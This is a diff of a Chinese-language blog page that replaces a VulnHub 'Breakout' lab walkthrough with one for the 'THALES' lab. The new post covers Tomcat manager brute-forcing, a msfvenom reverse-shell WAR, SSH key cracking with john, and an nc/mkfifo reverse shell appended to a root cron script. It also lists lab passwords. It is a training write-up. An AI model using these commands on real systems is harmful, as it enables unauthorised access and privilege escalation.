@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/13/Breakout/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/14/THALES/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/06/13/Breakout/" class="post-title-link" itemprop="url">Breakout</a>
+          <a href="/2023/06/14/THALES/" class="post-title-link" itemprop="url">THALES</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-06-13 15:54:34" itemprop="dateCreated datePublished" datetime="2023-06-13T15:54:34+08:00">2023-06-13</time>
+      <time title="创建时间：2023-06-14 10:42:23" itemprop="dateCreated datePublished" datetime="2023-06-14T10:42:23+08:00">2023-06-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +252,7 @@
     </span>
 
   
-    <span id="/2023/06/13/Breakout/" class="post-meta-item leancloud_visitors" data-flag-title="Breakout" title="阅读次数">
+    <span id="/2023/06/14/THALES/" class="post-meta-item leancloud_visitors" data-flag-title="THALES" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,7 +265,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.2k</span>
+      <span>934</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -283,50 +283,52 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a></p>
-<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>使用<code>nmap -sn 10.0.2.0/24</code>获取靶机的IP地址</p>
-<p><img src="/images/Breakout/image-20230613160024328.png" alt="image-20230613160024328"></p>
-<p>使用<code>nmap -sC -sV -p 1-20000 -o result.txt 10.0.2.13</code>获取主机的端口信息</p>
-<p><img src="/images/Breakout/image-20230613160158283.png" alt="image-20230613160158283"></p>
-<p>发现有139和445端口，然后使用<code>smbclient -L 10.0.2.13</code>查看一下</p>
-<p><img src="/images/Breakout/image-20230613160103804.png" alt="image-20230613160103804"></p>
-<p>但是无法进一步利用，访问<code>http://10.0.2.13</code></p>
-<p><img src="/images/Breakout/image-20230613160224353.png" alt="image-20230613160224353"></p>
-<p>在源码里面发现</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure>
+          <h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>使用<code>nmap -sn 10.0.2.0/24</code>获取主机的IP地址为<code>10.0.2.16</code></p>
+<p><img src="/images/THALES/image-20230614104516425.png" alt="image-20230614104516425"></p>
+<p>使用<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.16</code>获取主机的端口信息</p>
+<p><img src="/images/THALES/image-20230614104505180.png" alt="image-20230614104505180"></p>
+<p>访问http服务，发现是tomcat的网站，使用msf爆破其密码</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner/http/tomcat_mgr_login</span><br><span class="line">set rhosts 10.0.2.16</span><br><span class="line">set username tomcat</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p>这好像是<code>brainFuck</code>加密，进行解密得到密码：<code>https://ctf.bugku.com/tool/brainfuck</code></p>
-<p><img src="/images/Breakout/image-20230613160354420.png" alt="image-20230613160354420"></p>
+<p><img src="/images/THALES/image-20230614104708224.png" alt="image-20230614104708224"></p>
+<p><img src="/images/THALES/image-20230614104805728.png" alt="image-20230614104805728"></p>
+<p><img src="/images/THALES/image-20230614104906353.png" alt="image-20230614104906353"></p>
+<p>获取到账号<code>tomcat</code>，密码<code>role1</code></p>
+<p>使用其登录tomcat的管理后台</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/images/THALES/image-20230614105022290.png" alt="image-20230614105022290"></p>
+<p>进入<code>服务器管理</code>，然后进入<code>应用程序列表</code></p>
+<p><img src="/images/THALES/image-20230614105136229.png" alt="image-20230614105136229"></p>
+<p>可以上传war包，使用<code>msfvenom</code>生成一个war的反弹shell</p>
 <blockquote>
-<p>password：.2uqPEfj3D&lt;P’a-3</p>
+<p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.0.2.15 LPORT&#x3D;7777 -f war -o revshell.war</p>
 </blockquote>
-<p>然后使用<code>enum4linux -a 10.0.2.13</code>获取用户名</p>
-<p><img src="/images/Breakout/image-20230613160506628.png" alt="image-20230613160506628"></p>
-<p>因为这里也没有ssh，所以只能看看20000端口的服务了，发现是webmin的服务，使用刚刚得到的账号密码参数登录</p>
-<p><img src="/images/Breakout/image-20230613160724609.png" alt="image-20230613160724609"></p>
-<p><img src="/images/Breakout/image-20230613160757625.png" alt="image-20230613160757625"></p>
-<p>然后在下面发现可以执行命令，进行反弹shell</p>
-<p><img src="/images/Breakout/image-20230613160821758.png" alt="image-20230613160821758"></p>
-<p><img src="/images/Breakout/image-20230613160919225.png" alt="image-20230613160919225"></p>
-<p><img src="/images/Breakout/image-20230613160926731.png" alt="image-20230613160926731"></p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先升级shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">export TERM=xterm</span><br><span class="line">stty raw -echo;fg;reset</span><br></pre></td></tr></table></figure>
+<p><img src="/images/THALES/image-20230614105256097.png" alt="image-20230614105256097"></p>
+<p>进行上传，然后点击部署。</p>
+<p>监听本地端口，然后运行反弹shell</p>
+<p><img src="/images/THALES/image-20230614105340017.png" alt="image-20230614105340017"></p>
+<p><img src="/images/THALES/image-20230614105353475.png" alt="image-20230614105353475"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>我们先进行稳定shell</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm</span><br><span class="line">stty raw -echo;fg;</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/Breakout/image-20230613161433243.png" alt="image-20230613161433243"></p>
-<p>得到第一个flag</p>
-<p><img src="/images/Breakout/image-20230613161452038.png" alt="image-20230613161452038"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在<code>/var/backup/</code>目录下面发现一个<code>.old_pass</code>文件，但是没有权限读取</p>
-<p><img src="/images/Breakout/image-20230613161613576.png" alt="image-20230613161613576"></p>
-<p>返回到根目录下，查看tar文件的文件类型</p>
-<p><img src="/images/Breakout/image-20230613161645230.png" alt="image-20230613161645230"></p>
-<p>使用<code>getcap tar</code>查看，发现是<code>CAP_DAC_READ_SEARCH</code></p>
-<p><img src="/images/Breakout/image-20230613161713183.png" alt="image-20230613161713183"></p>
-<p><code>CAP_DAC_READ_SEARCH</code>表示他可以读取系统中的所有文件，所以我们可以使用其来读取<code>.old_pass</code>文件</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cf flag.tar /var/backups/.old_pass.bak	# 参数可以使用--help来进行查看</span><br><span class="line">tar -xf flag.tar</span><br><span class="line">cat var/backups/.old_pass.bak</span><br><span class="line">得到密码:Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Breakout/image-20230613161906349.png" alt="image-20230613161906349"></p>
-<p>切换为root用户，使用该密码进行登录</p>
-<p><img src="/images/Breakout/image-20230613162034411.png" alt="image-20230613162034411"></p>
+<p><img src="/images/THALES/image-20230614105522250.png" alt="image-20230614105522250"></p>
+<p>进入home目录下的用户目录，user.txt发现没有权限读取，但是我们可以使用<code>.ssh</code>里面的私钥进行登录</p>
+<p><img src="/images/THALES/image-20230614105714503.png" alt="image-20230614105714503"></p>
+<p>下载私钥之后使用<code>ssh2john id_rsa &gt; hash</code>对生成的密码进行爆破，保存秘钥到本地</p>
+<p>然后使用<code>john --wordlist=/usr/share/wordlists/rockyou.txt hash</code>进行爆破密码</p>
+<p><img src="/images/THALES/1282531-20211207123628384-1533936825.png" alt="1282531-20211207123628384-1533936825"></p>
+<p>得到密码<code>vodka06</code>，用户进行切换</p>
+<p><img src="/images/THALES/image-20230614111304990.png" alt="image-20230614111304990"></p>
+<p><img src="/images/THALES/image-20230614111321296.png" alt="image-20230614111321296"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看<code>backup.sh</code></p>
+<p><img src="/images/THALES/image-20230614111351807.png" alt="image-20230614111351807"></p>
+<p>这个文件是root身份运行的，我们可以使用其来反弹shell</p>
+<blockquote>
+<p>echo “rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.2.15 8888 &gt;&#x2F;tmp&#x2F;f” &gt;&gt; backup.sh</p>
+</blockquote>
+<p><img src="/images/THALES/image-20230614111529099.png" alt="image-20230614111529099"></p>
+<p>监听端口，过一会就可以获取到shell了</p>
+<p><img src="/images/THALES/image-20230614112010536.png" alt="image-20230614112010536"></p>
+<p><img src="/images/THALES/image-20230614112039652.png" alt="image-20230614112039652"></p>
 
       
     </div>
@@ -346,7 +348,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/13/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/13/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -370,7 +372,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
